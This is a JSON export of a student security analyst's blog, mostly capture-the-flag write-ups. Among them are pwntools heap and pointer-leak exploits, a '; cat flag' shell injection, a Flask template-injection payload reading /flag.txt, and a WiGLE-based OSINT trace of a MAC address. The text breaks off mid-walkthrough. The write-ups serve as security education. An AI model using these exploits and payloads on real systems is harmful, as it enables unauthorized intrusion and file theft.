
[{"content":" Warning! My opinions on this blog are my own and do not represent those of my employer Hi! Welcome to my dumpster.\nI\u0026rsquo;ve been in security operations for three years now, though my interests primarily lie in cybercrime intelligence and detection engineering. I\u0026rsquo;ve been fortunate enough to gain a ton of hands-on experience in cybersecurity through OSUSEC, a nationally recognized security club at Oregon State University, where I served as president. The skills I gained from leading and competing at OSUSEC enabled me to secure an internship at Mandiant (part of Google Cloud) as a technical intelligence analyst, which is what sparked my love in researching cybercrime.\nI graduated from OSU in 2023 with a BS in computer science with focus in cybersecurity, and a minor in mathematics with a focus on number theory and cryptography. Now, I work as a lead security analyst for OSU, finding innovative ways to use our Microsoft XDR and Sentinel platforms to respond to incidents, write detections + automation rules, mentor students, and improve the security posture of the university.\nOutside of cybersecurity, I am a fairly proficient drummer. I play a wide range of genres with a wide variety of people, though I have a soft spot for anything that\u0026rsquo;s heavy and loud. Some of my biggest influences currently are Mastodon, KGATLW, Acid Bath, Tool, Opeth, System of a Down, Foo Fighters, and Gojira. I also enjoy watching movies, especially independent or low budget flicks, and I\u0026rsquo;m always in search of a new \u0026ldquo;so bad it\u0026rsquo;s good\u0026rdquo; gem.\nFeel free to reach out, and/or send me cool raccoon pics :3\n","date":"24 May 2024","externalUrl":null,"permalink":"/about/","section":"Cameron McCawley","summary":"Warning!","title":"About","type":"page"},{"content":" Professional Experience # Lead Security Analyst Oct 2023 - Present Oregon State University Coffee Tea Milk Security Analyst Jun 2021 - Jun 2022, Sep 2022 - Oct 2023 Oregon State University Coffee Tea Milk Technical Intelligence Analyst Intern Jun 2022 - Aug 2022 Maniant (part of Google Cloud) Coffee Tea Milk Activities # Education # Awards # ","date":"24 May 2024","externalUrl":null,"permalink":"/resume/","section":"Cameron McCawley","summary":" Professional Experience # Lead Security Analyst Oct 2023 - Present Oregon State University Coffee Tea Milk Security Analyst Jun 2021 - Jun 2022, Sep 2022 - Oct 2023 Oregon State University Coffee Tea Milk Technical Intelligence Analyst Intern Jun 2022 - Aug 2022 Maniant (part of Google Cloud) Coffee Tea Milk Activities # Education # Awards # ","title":"Resume","type":"page"},{"content":"","date":"18 April 2021","externalUrl":null,"permalink":"/","section":"Cameron McCawley","summary":"","title":"Cameron McCawley","type":"page"},{"content":"","date":"18 April 2021","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"ctf","type":"tags"},{"content":" My assistant sent me this .wav as an update on a case he is working on, however I dont know what to do with it. Such a frustrating April Fools Joke, and I\u0026rsquo;m missing an update on this case.\nFor this challenge, we are given a WAV file that when played, Rick Rolls us\u0026hellip;. Thank you Lyell, very cool.\nAfter messing around with the file for a bit trying to figure out what to do with it, we eventually realized that there were frequencies in the song that were much too high to show up in audacity, so using an online tool to look at the file\u0026rsquo;s spectrogram, we see a link!\nGreat! Following that link leads us to a pastebin with the following text:\nCase 20210410-001 Update: 4/16/2021 Haha, I made you solve a stego chall to get an update on this case! Happy late April fools! I\u0026#39;ve looked into that WLAN hotspot thing and I think I\u0026#39;ve got a lead. It\u0026#39;s a guy who goes by \u0026#34;Barron Benedict Jr. III\u0026#34;, an alleged resident of Ascension island... I\u0026#39;ve seen him use online username \u0026#34;TwoBoatsMan2\u0026#34;, but apart from that, I have no further progress, I\u0026#39;ve been addicted to this game AmongUs... So we have a username: \u0026ldquo;TwoBoatsMan2\u0026rdquo;. Let\u0026rsquo;s run this through namechk.com to see what accounts are linked to that username:\nLooks like it found a twitter account with that username! We can check to see if it\u0026rsquo;s what we are looking for by simply following the link to the twitter account:\nAnd sure enough, we find the account we are looking for. Scrolling through the tweets (they\u0026rsquo;re not that many of them), we see that this user poseted an image of their desktop. Interesting\u0026hellip;\nUpon closer inspection, we can see that the user has reddit open in one of their tabs with the username of \u0026ldquo;ascension-wlan\u0026rdquo;. Going to their reddit account, we see a similar post to the twitter one we just looked at, except this time we can see a bit more of that network connection info window behind the web browser.\nAnd zooming in:\nWe get all sorts of info here, but the juciest thing is that physical MAC address. Looking below the post, we see a comment that says:\nHAHA Maybe later I will share the full Hotspot Story! My third neighbor (who will remain anonymous) was really out of his gourd this time, claiming he was scanning my network, and that now the world knows I\u0026#39;m operating a hotspot.. whatever that means. Now the world knows I\u0026rsquo;m operating a hotspot\nOh man, now this is getting good. If the whole world can see he is operating a hotspot, how can we see that? Digging through osintframework.com we see a tool titled \u0026ldquo;WiGLE: Wireless Network Mapping\u0026rdquo;. Through this site, we can just enter in a MAC address and see not only where that device is emmitting a wireless signal, but also the name of that wireless network. Typing in our MAC address we got from the screenshot and we get our flag!\nOSU{OSINT_aint_that_hard}\n","date":"18 April 2021","externalUrl":null,"permalink":"/posts/1716572228264-scrambled_noodles/","section":"Posts","summary":"My assistant sent me this .","title":"OSU League 2020/2021 - scrambled_noodles Writeup","type":"posts"},{"content":"","date":"18 April 2021","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"18 April 2021","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" The pwn finale!\nFor this challenge, we are given a fairly complicated binary, which follows the theme of the previous two challenges of being a binary based around the GNU Chess program. The main gimmick for this program is that it allows you to spawn multiple threads of GNU Chess and schedule the threads as processes, so let\u0026rsquo;s just jump right in and start taking a closer look at the binary.\nAfter messing around with the program for a bit, there seemed to be a few core components that were of interest. The first is that we can delete logs, second we allocate processes, third we can edit the data in a process, and finally we can schedule a process. These are all pretty clear signs of a heap exploitation challenge, specifically a use after free. Let\u0026rsquo;s start with how the program is deleting logs.\nAfter a lot of reverse engineering to figure out what variables were what and also reconstructing the structures used in the code, we were able to get this for the delete portion:\nprintf(\u0026#34;ENTER THE ID OF THE LOG YOU WOULD LIKE TO DELETE: \u0026#34;); fgets(local_2a, 10, stdin); __isoc99_scanf(local_2a, \u0026amp;DAT_00101e91, \u0026amp;log_num2); if((log_num2 \u0026lt; 0) || ((int)*num_logs \u0026lt;= log_num2)) { puts(\u0026#34;INVALID LOG ID\u0026#34;); }else{ unless_thing_that_ghidra_added = logs[log_num2]; *num_logs = *num_logs - 1; logs[log_num2] = logs[(int)*num_log]; free(logs[(int)*num_log]); } We can clearly see here that this piece of code replaces whichever log you choose to delete with the last log in the list, and then frees the last log in the list. Which seems like it could be problematic since log is a log**. We have ourselves a use after free vulnerability. Perfect!!!\nAs for the structs, there are two of them in this program. One for the logs and one for the process (which are oh so conviently the same size would you look at that). The process struct also has a char array which holds the command that is to be excecuted, so all we have to do is overwrite that buffer with the command we want to excecute and we\u0026rsquo;ll have the flag!\nSo how do we exploit this? Well, we already know that we can edit the description of a log and that there is a UAF vulnerability, so if can somehow load the process struct into the same block of memory as our previously deleted log struct with our payload, we can overwrite out process command buffer.\nCrafting the exploit would go as follows:\nFirst we add a new process log. We delete the second to last log causing the last one to fill its place without freeing it. We then edit that process log\u0026rsquo;s description to be a payload of 2,560 bytes followed by a /bin/sh. This is just enough of an offset for the /bin/sh to be loaded into the command buffer of the process struct when we load it into memory. We then allocate a new process, essentially using the same block of memory as our previously shifted log. We then just have to schedule the process to run, and it will execute out command. Let\u0026rsquo;s put that into a script:\nfrom pwn import * from time import * io = remote(\u0026#39;ctf-league.osusec.org\u0026#39;, 31316) #io = process(\u0026#34;./ncep_magnus\u0026#34;) payload = b\u0026#34;A\u0026#34;*0xa00 + b\u0026#39;/bin/sh\\x00\u0026#39; print(io.recvuntil(\u0026#34;permitted by law.\u0026#34;).decode()) #quit out of the first couple games io.sendline() sleep(5) print(io.recv(timeout=1)) io.sendline() sleep(5) print(io.recv(timeout=1)) sleep(5) #Open up the log menu io.sendline(\u0026#34;INT1\u0026#34;) #add new process log print(io.recvuntil(\u0026#34;5. EXIT\u0026#34;).decode()) print(io.recvline().decode()) io.sendline(\u0026#34;2\u0026#34;) #delete second to last log print(io.recvuntil(\u0026#34;5. EXIT\u0026#34;).decode()) print(io.recvline().decode()) io.sendline(\u0026#34;4\u0026#34;) print(io.recv(timeout=1).decode()) io.sendline(\u0026#34;4\u0026#34;) #edit process log print(io.recvuntil(\u0026#34;5. EXIT\u0026#34;).decode()) print(io.recvline().decode()) io.sendline(\u0026#34;3\u0026#34;) print(io.recv(timeout=1).decode()) io.sendline(\u0026#34;4\u0026#34;) print(io.recvuntil(\u0026#34;4. UPDATE DESCRIPTION\u0026#34;).decode()) io.sendline(\u0026#34;4\u0026#34;) #enter payload print(io.recv(timeout=1).decode()) io.sendline(payload) #exit log menu print(io.recvuntil(\u0026#34;5. EXIT\u0026#34;).decode()) print(io.recvline().decode()) io.sendline(\u0026#34;5\u0026#34;) #open process menu print(io.recv().decode()) sleep(5) io.sendline(\u0026#34;INT2\u0026#34;) #allocate new process print(io.recv(timeout=1).decode()) io.sendline(\u0026#34;1\u0026#34;) #schedule process print(io.recv(timeout=1).decode()) io.sendline(\u0026#34;3\u0026#34;) io.interactive() And running the exploit and spamming cat flag, we get out flag!\nthepitchdoctor:/$ python2 exploit.py $ cat flag White (1) : Invalid move: cat flag $ cat flag White (1) : ==========CONTEXT SWITCH: GAME #4 HAS BEEN SCHEDULED========== GNU Chess 6.2.5 Copyright (C) 2017 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. White (1) : $ cat flag Invalid move: cat flag White (1) : ==========CONTEXT SWITCH: GAME #5 HAS BEEN SCHEDULED========== AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ cat flag AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAosu{W3_$K1Pp3d_3riC} osu{W3_$K1Pp3d_3riC} ","date":"12 April 2021","externalUrl":null,"permalink":"/posts/1716571568050-ncep_magnus/","section":"Posts","summary":"The pwn finale!","title":"OSU League 2020/2021 - NCEP_MAGNUS Writeup","type":"posts"},{"content":"For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC. Running the program there is that same GNU chess game that we can interact with, but this time we have no control over the command line arguments, so no injection. Messing around with the program we can see that the only place we have any sort of control is when we make our move:\nflag loaded at 0x562c0e2e8260 executing command: /usr/games/gnuchess -g -m GNU Chess 6.2.5 Copyright (C) 2017 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. White (1) : We are also given the location in memory of where the flag is loaded in at, which gives us a clue that whatever our payload is going to be must include it. At this point we started to do some static analysis to see where we could exploit something.\nSince there is only one place in the program where we can put in user input, we started our reverse engineering there:\nvoid get_input(long param_1) { memset((void *)(param_1 + 0x110),0,0x100); fgets((char *)(param_1 + 0x110),0x500,stdin); return; } Interseting, it looks like we do an fgets to param_1 plus an offset, but param_1 is a variable that was passed into this function, so we followed that parameter up to see where it came from. Eventually, we were led to the main function of the program where we can see where it was initilized:\nundefined8 main(void) { void *__ptr; void *__ptr_00; __ptr = (void *)load_flag(); __ptr_00 = malloc(0x21c); init_game(__ptr_00); printf(\u0026#34;executing command: %s\\n\u0026#34;,*(undefined8 *)((long)__ptr_00 + 0x210)); launch_gnuchess(__ptr_00); thread_handler(__ptr_00); printf(\u0026#34;finished executing command %s\\n\u0026#34;,*(undefined8 *)((long)__ptr_00 + 0x210)); free(__ptr_00); free(__ptr); return 0; } So now we know that void *__ptr_00 is our param_1, but what is interesting here is how much it is being reused. We can see that it is used in the first printf to print the command that was excecuted, but then it gets passed into the thread_handler function, which is what eventually leads to our fgets being called. So the same pointer holding the string of our command is also being used for the fgets. This normally wouldn\u0026rsquo;t be a problem since a null terminator is used to mark the end of a string, but here we see that quite a large buffer was used to allocate this particular char array. Maybe if we fill up that buffer and put the address of our flag in the string, we can make the second printf print the flag. Let\u0026rsquo;s try it out:\nfrom pwn import * import os, sys io = remote(\u0026#39;ctf.ropcity.com\u0026#39;, 31315) io.recvuntil(\u0026#34;flag loaded at \u0026#34;) addr = int(io.recvline(), 16) flag = p64(addr) io.recvuntil(\u0026#34;White (1) : \u0026#34;) payload = flag*100 io.sendline(payload) io.interactive() And running it we get the flag: osu{ro$eN_w1LL_not_8e_th1$_4givinG}\n","date":"11 April 2021","externalUrl":null,"permalink":"/posts/1716571427450-ncep_botez/","section":"Posts","summary":"For this challenge, we are given a binary that is very similar looking to the one from NCEP_XQC.","title":"OSU League 2020/2021 - NCEP_BOTEZ Writeup","type":"posts"},{"content":"For this challenge, we are given a simple program that just runs GNU chess. Right away we can see that it lets us input command line arguments! Maybe we can just do a simple commandline injection to cat the flag:\n$ nc ctf.ropcity.com 31314 WELCOME TO THE NORWEGIAN COLLEGE OF ELITE PWN Please enter your custom command line arguments, or just hit enter to begin your training: ; cat flag executing command: /usr/games/gnuchess -g -m ; cat flag GNU Chess 6.2.5 Copyright (C) 2017 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later \u0026lt;http://gnu.org/licenses/gpl.html\u0026gt; This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. White (1) : quit osu{WeLc0m3_T0_tH3_c0LLe6e_0f_pWN} finished executing command /usr/games/gnuchess -g -m ; cat flag And we get the flag!\nosu{WeLc0m3_T0_tH3_c0LLe6e_0f_pWN}\nWelp\u0026hellip; Looks like that was it. A good beginner challenge for this series!\n","date":"10 April 2021","externalUrl":null,"permalink":"/posts/1716571484177-ncep_xqc/","section":"Posts","summary":"For this challenge, we are given a simple program that just runs GNU chess.","title":"OSU League 2020/2021 - NCEP_XQC Writeup","type":"posts"},{"content":"For this challenge, we are given a website that bears a resemblance to a previous challenge we did (cowsay), though this one is a bit more complicated.\nWe can start by just entering in some text and seeing what happens:\nNeat! Let\u0026rsquo;s look at the source code:\n# coding=utf-8 from flask import render_template, render_template_string, flash, redirect, session, url_for, request, g, Markup, Response from app import app import uuid import traceback import os def _generate_cowsay_file(): return \u0026#39;/tmp/cow-\u0026#39; + str(uuid.uuid4()) @app.route(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/index\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/cowsay\u0026#39;) def cowsay(): filename_in = _generate_cowsay_file() filename_out = _generate_cowsay_file() with open(filename_in, \u0026#39;w\u0026#39;) as f: f.write(str(request.args.get(\u0026#39;msg\u0026#39;))[:2000]) # cowsay! os.system(\u0026#39;cat \u0026#39; + filename_in + \u0026#39; | /usr/games/cowsay -TU -W 2000 \u0026gt; \u0026#39; + filename_out + \u0026#39; 2\u0026gt;\u0026amp;1\u0026#39;) return redirect(\u0026#39;/render?path=\u0026#39; + filename_out, code=302) @app.route(\u0026#39;/render\u0026#39;) def about(): try: with open(request.args.get(\u0026#39;path\u0026#39;, \u0026#39;layout.html\u0026#39;), \u0026#39;r\u0026#39;) as f: resp = render_template_string(\u0026#39;\u0026#39;\u0026#39;{% extends \u0026#34;layout.html\u0026#34; %}{% block content %}\u0026lt;div class=\u0026#34;jumbo\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Your cow says...\u0026lt;/h1\u0026gt;\u0026lt;code\u0026gt;\u0026#39;\u0026#39;\u0026#39; + f.read() + \u0026#39;\u0026#39;\u0026#39;\u0026lt;/code\u0026gt;\u0026lt;br\u0026gt;\u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;/\u0026#34;\u0026gt;do it again!!!!!!!!!\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt;\u0026lt;/div\u0026gt;{% endblock %}\u0026#39;\u0026#39;\u0026#39;) # check if the user is trying to do something evil :(( if u\u0026#39;OSUSEC{\u0026#39; in resp: resp = u\u0026#39;I see the flag in the response! Nice try.\u0026#39; return Response(response=resp, status=200) except: msg = \u0026#39;We could not fetch your page! Sorry :(\\n\\n\u0026#39; + traceback.format_exc() return Response(response=msg, status=500, mimetype=\u0026#39;text/plain\u0026#39;) Ah, we have a Flask challenge. We\u0026rsquo;ve done this before (see nopship)! All we have to do is a Flask injection to do arbitrary read on flag.txt, but there is a slight problem, the server actually checks to see if \u0026lsquo;OSUSEC{\u0026rsquo; is in the output, and aborts if it does. That\u0026rsquo;s ok, because we can just read only the text after that.\nDoing a simple google search for arbitrary read with Flask injection will give us our payload:\n{{ config.items()[4][1].__class__.__mro__[1].__subclasses__()[40](\u0026#34;/flag.txt\u0026#34;).read()[27:120] }} And running it we get the flag!\nOSUSEC{ok_s0_y0u_f1gur3d-out_d1rect0ry-tr@versal_w0nt-b3_helpful-here?} ","date":"7 March 2021","externalUrl":null,"permalink":"/posts/1716572461312-web3/","section":"Posts","summary":"For this challenge, we are given a website that bears a resemblance to a previous challenge we did (cowsay), though this one is a bit more complicated.","title":"OSU League 2020/2021 - WEB_THREE","type":"posts"},{"content":" Time to poke at a linux box and see what there is to find. Im going to give you the flag right now, and the program to decrypt it too! You will have to find 7 flags to solve this challenge! They will be combined through Shamir Secret Sharing, and allow you to decrypt the flag!\nFor this challenge, we worked in one large group taking turns to solve various parts of the box. Because of this, and because of the poor documentation we had while solving the box, some of the solutions we came up with are going to be a bit fuzzy in this writeup.\nTo start, we are given an IP address of a linux box, so let\u0026rsquo;s do what every pentester must do and give that boy an nmap:\nStarting Nmap 7.70 ( https://nmap.org ) at 2021-02-26 18:15 PST Nmap scan report for 172.17.0.2 Host is up (0.00030s latency). Not shown: 65533 closed ports PORT STATE SERVICE 1337/tcp open waste 13337/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 3.76 seconds Great! We have two open ports, let\u0026rsquo;s netcat to them to see what\u0026rsquo;s up.\nConnection to port 1337, we get this:\nSSH Backup service, Key requested... Implementing security... done... sending... SWhJaHVpZHNkSWhJaDtnc2RlZHNoYmo7TVIxdU1SMEJTVGVLVWhDUVREV05UME9ISEdDUlJXW0NXRFRmUjFXW01SMXVNUjFKWGtPQmNGS3RVb3FpUHtHeFZtaXNlRlNwU1RHQ1BUR0NQamIwZWxLdVdUR0NQVEdHWGwxNGVXcVNQVEdDUFRHQ1BUR0NQakdDUFRHT2UxR0NQVEcxZGxMeFsyU2BXdnFTZFQ0VFdZaVFUVEdDUFRPQlhsU2xYVmIzWGxHbmNHaTVSMkB2VGxbRWNVbXtSMk9yWzBDMltEdWBiSWltZWtXc1cybXRbSVdoVFRHQ1BUcURlVmlKW1Y5MmMwT1hCb0dDUFRHQ1BZUzdYe0tvZUdxWVRZbU5XR1c1VTBHQ1BUR0VQbEtqW2xHb09sS2lgRnlYZER1dkxHS2xQMzE0YjF1e2NGZVBlM1NNVm9DNVtZWDBgMGU0Y2xTMFhtREpQVEdDU1RPM2BUW3dTR3EwVFVpb1t4dWtWbEwxV2tLSFRUTzJOR21PWFdxamVHW1ZNMk9VTzFPcmMzU1BgVDByZUVENGJUU3ZlSUdJV2xbR2JWNFJTa2lNWGtLMmJQcTRXMUR3UGtDdmNWNEZPaDh1VGxLTVtFSDBlREdDUFRHRUwxcUNYe09WYDNIe1tJW2hMbUszUFdHS1FQbnVNUjF1TVRXTlNCQ1FURFdOVDBPSEhHQ1JSV1tDV0RUZlIxV1tNUjF1TVIxSjspMy0wOTgzODMxNTE2ODI5NTk0OTYzODI3NDU1MzIzNzU5MDI5ODMxNSg= goodbye! Interesting\u0026hellip; let\u0026rsquo;s do it again:\nSSH Backup service, Key requested... Implementing security... done... sending... FjcWNyo2Oyw7FjcWN2Q4LDs6Oyw3PTVkEg1uKhINbx0MCzoUCjccDgsbCBELbxAXFxgcDQ0IBBwIGws5DW4IBBINbioSDW4VBzQQHTwZFCsKMC42DyQYJwkyNiw6GQwvDAsYHA8LGBwPNT1vOjMUKggLGBwPCxgYBzNuazoILgwPCxgcDwsYHA8LGBwPNRgcDwsYEDpuGBwPCxhuOzMTJwRtDD8IKS4MOwtrCwgGNg4LCxgcDwsQHQczDDMHCT1sBzMYMTwYNmoNbR8pCzMEGjwKMiQNbRAtBG8cbQQbKj89FjYyOjQILAhtMisEFgg3CwsYHA8LLhs6CTYVBAlmbTxvEAcdMBgcDwsYHA8GDGgHJBQwOhguBgsGMhEIGAhqCm8YHA8LGBoPMxQ1BDMYMBAzFDY/GSYHOxsqKRMYFDMPbG5rPW4qJDwZOg86bAwSCTAcagQGB28/bzprPDMMbwcyGxUPCxgcDAsQbD8LBCgMGC5vCwo2MAQnKjQJMxNuCDQUFwsLEG0RGDIQBwguNToYBAkSbRAKEG4QLTxsDA8/C28tOhobaz0LDCk6FhgWCDMEGD0Jaw0MNDYSBzQUbT0PLmsIbhsoDzQcKTwJaxkQN2cqCzMUEgQaF286GxgcDwsYGhNuLhwHJBAJP2wXJAQWBDcTMhRsDwgYFA4PMSoSDW4qEgsIEQwdHA4LGwgRC28QFxcYHA0NCAQcCBsLOQ1uCAQSDW4qEg1uFWR2bHJvZmdsZ2xuam5pZ21mamZrZmlsZ21oa2pqbG1saGpmb21mZ2xuanc= goodbye! We did this a few more times until one of us decided to compare some in hex:\n16 37 16 37 2a 36 3b 2c 3b 16 37 16 37 64 38 2c 3b 3a 3b 2c 37 3d 35 64 12 0d 6e 2a 12 0d 6f 1d 0c 0b 3a 14 0a 37 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 07 34 10 1d 3c 19 14 2b 0a 30 2e 36 0f 24 18 27 09 32 36 2c 3a 19 0c 2f 0c 0b 18 1c 0f 0b 18 1c 0f 35 3d 6f 3a 33 14 2a 08 0b 18 1c 0f 0b 18 18 07 33 6e 6b 3a 08 2e 0c 0f 0b 18 1c 0f 0b 18 1c 0f 0b 18 1c 0f 35 18 1c 0f 0b 18 10 3a 6e 18 1c 0f 0b 18 6e 3b 33 13 27 04 6d 0c 3f 08 29 2e 0c 3b 0b 6b 0b 08 06 36 0e 0b 0b 18 1c 0f 0b 10 1d 07 33 0c 33 07 09 3d 6c 07 33 18 31 3c 18 36 6a 0d 6d 1f 29 0b 33 04 1a 3c 0a 32 24 0d 6d 10 2d 04 6f 1c 6d 04 1b 2a 3f 3d 16 36 32 3a 34 08 2c 08 6d 32 2b 04 16 08 37 0b 0b 18 1c 0f 0b 2e 1b 3a 09 36 15 04 09 66 6d 3c 6f 10 07 1d 30 18 1c 0f 0b 18 1c 0f 06 0c 68 07 24 14 30 3a 18 2e 06 0b 06 32 11 08 18 08 6a 0a 6f 18 1c 0f 0b 18 1a 0f 33 14 35 04 33 18 30 10 33 14 36 3f 19 26 07 3b 1b 2a 29 13 18 14 33 0f 6c 6e 6b 3d 6e 2a 24 3c 19 3a 0f 3a 6c 0c 12 09 30 1c 6a 04 06 07 6f 3f 6f 3a 6b 3c 33 0c 6f 07 32 1b 15 0f 0b 18 1c 0c 0b 10 6c 3f 0b 04 28 0c 18 2e 6f 0b 0a 36 30 04 27 2a 34 09 33 13 6e 08 34 14 17 0b 0b 10 6d 11 18 32 10 07 08 2e 35 3a 18 04 09 12 6d 10 0a 10 6e 10 2d 3c 6c 0c 0f 3f 0b 6f 2d 3a 1a 1b 6b 3d 0b 0c 29 3a 16 18 16 08 33 04 18 3d 09 6b 0d 0c 34 36 12 07 34 14 6d 3d 0f 2e 6b 08 6e 1b 28 0f 34 1c 29 3c 09 6b 19 10 37 67 2a 0b 33 14 12 04 1a 17 6f 3a 1b 18 1c 0f 0b 18 1a 13 6e 2e 1c 07 24 10 09 3f 6c 17 24 04 16 04 37 13 32 14 6c 0f 08 18 14 0e 0f 31 2a 12 0d 6e 2a 12 0b 08 11 0c 1d 1c 0e 0b 1b 08 11 0b 6f 10 17 17 18 1c 0d 0d 08 04 1c 08 1b 0b 39 0d 6e 08 04 12 0d 6e 2a 12 0d 6e 15 64 76 6c 72 6f 66 67 6c 67 6c 6e 6a 6e 69 67 6d 66 6a 66 6b 66 69 6c 67 6d 68 6b 6a 6a 6c 6d 6c 68 6a 66 6f 6d 66 67 6c 6e 6a 77 81 a0 81 a0 bd a1 ac bb ac 81 a0 81 a0 f3 af bb ac ad ac bb a0 aa a2 f3 85 9a f9 bd 85 9a f8 8a 9b 9c ad 83 9d a0 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 90 a3 87 8a ab 8e 83 bc 9d a7 b9 a1 98 b3 8f b0 9e a5 a1 bb ad 8e 9b b8 9b 9c 8f 8b 98 9c 8f 8b 98 a2 aa f8 ad a4 83 bd 9f 9c 8f 8b 98 9c 8f 8f 90 a4 f9 fc ad 9f b9 9b 98 9c 8f 8b 98 9c 8f 8b 98 9c 8f 8b 98 a2 8f 8b 98 9c 8f 87 ad f9 8f 8b 98 9c 8f f9 ac a4 84 b0 93 fa 9b a8 9f be b9 9b ac 9c fc 9c 9f 91 a1 99 9c 9c 8f 8b 98 9c 87 8a 90 a4 9b a4 90 9e aa fb 90 a4 8f a6 ab 8f a1 fd 9a fa 88 be 9c a4 93 8d ab 9d a5 b3 9a fa 87 ba 93 f8 8b fa 93 8c bd a8 aa 81 a1 a5 ad a3 9f bb 9f fa a5 bc 93 81 9f a0 9c 9c 8f 8b 98 9c b9 8c ad 9e a1 82 93 9e f1 fa ab f8 87 90 8a a7 8f 8b 98 9c 8f 8b 98 91 9b ff 90 b3 83 a7 ad 8f b9 91 9c 91 a5 86 9f 8f 9f fd 9d f8 8f 8b 98 9c 8f 8d 98 a4 83 a2 93 a4 8f a7 87 a4 83 a1 a8 8e b1 90 ac 8c bd be 84 8f 83 a4 98 fb f9 fc aa f9 bd b3 ab 8e ad 98 ad fb 9b 85 9e a7 8b fd 93 91 90 f8 a8 f8 ad fc ab a4 9b f8 90 a5 8c 82 98 9c 8f 8b 9b 9c 87 fb a8 9c 93 bf 9b 8f b9 f8 9c 9d a1 a7 93 b0 bd a3 9e a4 84 f9 9f a3 83 80 9c 9c 87 fa 86 8f a5 87 90 9f b9 a2 ad 8f 93 9e 85 fa 87 9d 87 f9 87 ba ab fb 9b 98 a8 9c f8 ba ad 8d 8c fc aa 9c 9b be ad 81 8f 81 9f a4 93 8f aa 9e fc 9a 9b a3 a1 85 90 a3 83 fa aa 98 b9 fc 9f f9 8c bf 98 a3 8b be ab 9e fc 8e 87 a0 f0 bd 9c a4 83 85 93 8d 80 f8 ad 8c 8f 8b 98 9c 8f 8d 84 f9 b9 8b 90 b3 87 9e a8 fb 80 b3 93 81 93 a0 84 a5 83 fb 98 9f 8f 83 99 98 a6 bd 85 9a f9 bd 85 9c 9f 86 9b 8a 8b 99 9c 8c 9f 86 9c f8 87 80 80 8f 8b 9a 9a 9f 93 8b 9f 8c 9c ae 9a f9 9f 93 85 9a f9 bd 85 9a f9 82 f3 e1 fb e5 f8 f1 f0 fb f0 fb f9 fd f9 fe f0 fa f1 fd f1 fc f1 fe fb f0 fa ff fc fd fd fb fa fb ff fd f1 f8 fa f1 f0 fb f9 fd e0 This is interesting! We can see that the first 4 bytes repeat! 16 37 16 37 and 81 a0 81 a0. Our god-like guess skills intuition told us that this is being XORed with a random key, so let\u0026rsquo;s bruteforce our way to solution:\nKey = 01: 